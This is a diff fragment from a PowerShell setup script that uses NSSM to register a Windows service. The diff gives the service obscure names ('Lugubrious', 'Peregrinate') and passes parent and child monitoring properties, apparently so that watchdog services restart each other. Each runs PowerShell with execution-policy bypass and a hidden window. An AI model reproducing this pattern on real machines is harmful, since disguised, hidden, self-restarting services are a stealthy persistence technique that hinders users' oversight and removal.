@@ -36,9 +36,12 @@ if(($rootPath -eq $null) -or ($rootPath -eq "")){
     $rootPath = "$rootPath\root.ps1"
 }
 
-$serviceName = "MyRootMonService"
+$serviceName = "Lugubrious"
+$childServiceName = "Peregrinate"
+$childServicePropertyName = "root"
+$parentServicePropertyName = "rootMonMon"
 $exePath = "powershell.exe"
-$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath'"
+$arguments = "-ep bypass -noP -w hidden $scriptPath -rootPath '$rootPath' -basePath '$basePath' -childServiceName $childServiceName -childServicePropertyName $childServicePropertyName -parentServicePropertyName $parentServicePropertyName"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
     New-Item -Path $nssmFolder -ItemType Directory -Force
